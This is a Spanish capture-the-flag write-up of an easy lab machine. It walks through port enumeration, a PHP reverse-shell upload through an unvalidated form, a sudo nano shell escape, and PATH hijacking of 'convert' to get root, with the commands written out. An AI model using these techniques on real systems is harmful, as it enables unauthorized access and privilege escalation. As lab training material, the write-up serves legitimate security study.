## Resumen

Es una máquina de dificultad fácil en la que se encuentra un subdirectorio en el que se pueden subir archivos sin validación, y se escalan los privilegios primero mediante un comando `sudo` mal configurado (nano) y después vía path hijacking.

## Enumeración

Empiezo haciendo un ping a la máquina para saber qué SO usa.

`ping -c 1 172.17.0.2`

```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.144 ms
```

Con esto sé que es una máquina Linux.

Sigo con nmap para escanear los puertos abiertos.

`nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap`

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Gallery
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 56:3F:2D:5C:DF:1E (Unknown)
Service Info: OS: Unix
```

Puertos encontrados:

```
FTP/21
Apache/80
```

Primero entro al servidor FTP ya que permite login anónimo, pero solo encuentro imágenes dentro del directorio raíz. El listado también muestra un subdirectorio `ftp`, que reviso y no contiene nada relevante, así que paso a analizar el Apache.

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xrwx    1 ftp      ftp          4096 Mar 30  2025 ftp
-rw-r--r--    1 ftp      ftp        335070 Mar 27  2025 image_1.jpg
-rw-r--r--    1 ftp      ftp        442122 Mar 27  2025 image_2.jpg
-rw-r--r--    1 ftp      ftp        459934 Mar 27  2025 image_3.jpg
-rw-r--r--    1 ftp      ftp        319652 Mar 27  2025 image_4.jpg
-rw-r--r--    1 ftp      ftp        480742 Mar 27  2025 image_5.jpg
-rw-r--r--    1 ftp      ftp        493404 Mar 27  2025 image_6.jpg
-rw-r--r--    1 ftp      ftp        434472 Mar 27  2025 image_7.jpg
```

## Análisis puerto 80

Al entrar veo que es una galería de fotos. Revisando el código fuente de la página encuentro las rutas de las imágenes:

`http://172.17.0.2/gallery/uploads/images/*nombre-imagen*`

```html
<h1>Gallery</h1>
<div class="gallery">
  <div class="img1"><img src="gallery/uploads/images/image_1.jpg" alt="Image 1"></div>
  <div class="img2"><img src="gallery/uploads/images/image_2.jpg" alt="Image 2"></div>
  <div class="img3"><img src="gallery/uploads/images/image_3.jpg" alt="Image 3"></div>
  <div class="img4"><img src="gallery/uploads/images/image_4.jpg" alt="Image 4"></div>
  <div class="img5"><img src="gallery/uploads/images/image_5.jpg" alt="Image 5"></div>
  <div class="img6"><img src="gallery/uploads/images/image_6.jpg" alt="Image 6"></div>
  <div class="img7"><img src="gallery/uploads/images/image_7.jpg" alt="Image 7"></div>
</div>
```

A partir de la ruta `gallery/uploads/`, pruebo a acceder directamente a `gallery/uploads/handler.php` y descubro que es el endpoint que procesa la subida de imágenes:

`curl http://172.17.0.2/gallery/uploads/handler.php`

```html
<form enctype="multipart/form-data" method="POST">
    <input name="image" type="file" />
    <input type="submit" value="Subir imagen" />
</form>
```

El formulario no valida la extensión del archivo subido, por lo que es vulnerable a subida arbitraria de ficheros.

## Explotación

Decido subir la revshell de PHP de pentestmonkey (`rev.php`).

Pongo el listener:

`nc -lvnp 4444`

Subo la revshell a través del formulario. El propio mensaje de éxito confirma el nombre con el que queda guardada:

```
Archivo subido exitosamente: rev.php
```

Como conozco la ruta de subida (`gallery/uploads/images/`), accedo directamente al archivo para ejecutarlo:

`curl http://172.17.0.2/gallery/uploads/images/rev.php`

Y recibo la conexión en el listener, consiguiendo acceso como `www-data`:

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Estabilización de shell

Estabilizo la shell.

```
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

## Escalada de privilegios

Empiezo ejecutando `sudo -l` para ver si puedo ejecutar algo como otro usuario.

```
sudo -l

User www-data may run the following commands on 93aa64933514:
    (gallery) NOPASSWD: /bin/nano
```

Veo que puedo ejecutar `nano` como el usuario `gallery` sin contraseña.

`sudo -u gallery nano`

```
^R^X
reset; sh 1>&0 2>&0
```

Esto abre una shell como el usuario `gallery`.

```
$ id
uid=1000(gallery) gid=1000(gallery) groups=1000(gallery)
```

Vuelvo a comprobar los permisos sudo con el nuevo usuario.

```
sudo -l

User gallery may run the following commands on 93aa64933514:
    (ALL) NOPASSWD: /usr/local/bin/runme
```

Veo que puedo ejecutar el binario `/usr/local/bin/runme` como cualquier usuario, así que lo ejecuto primero con `sudo` para ver qué hace.

```
sudo /usr/local/bin/runme

Converting image...
sh: 1: convert: not found
Done.
```

El script intenta llamar al comando `convert` sin ruta absoluta. Al no encontrarlo en el `PATH` actual, es vulnerable a **path hijacking**: creando un script que ejecute una shell con privilegios elevados  y luego modificando el `PATH` para que se resuelva  antes del convert original y así al ejecutar de nuevo `/usr/local/bin/runme` conseguiríamos una shell con root.

```
echo '#!/bin/bash' > /tmp/convert
echo 'bash' >> /tmp/convert
chmod +x /tmp/convert
export PATH=/tmp:$PATH
sudo /usr/local/bin/runme
```

Al ejecutar `runme` de nuevo, usa el `convert` de `/tmp` en lugar del real, y como `runme` corre como root, la shell resultante también lo es.

```
id
uid=0(root) gid=0(root) groups=0(root)
```

Con esto consigo acceso total al sistema así completando la maquina.

## Flujo de ataque

1. **Enumeración:** Se encuentran los puertos `FTP/21` y `Apache/80` vía nmap.
2. **Análisis puerto 80:** Al revisar el código fuente de la web se encuentra la ruta de subida de imágenes y el endpoint `handler.php`, que no valida la extensión del archivo.
3. **Explotación:** Se sube una revshell PHP a través del formulario y se ejecuta accediendo directamente a su ruta, consiguiendo acceso inicial como `www-data`.
4. **Escalada de privilegios:** Con `sudo -l` como `www-data` se descubre que se puede ejecutar `nano` como el usuario `gallery`, lo que permite escapar a una shell con ese usuario. Repitiendo `sudo -l` como `gallery` se encuentra el binario `/usr/local/bin/runme` ejecutable como cualquier usuario, vulnerable a **path hijacking** por depender de `convert` sin ruta absoluta, lo que permite obtener una shell como `root`.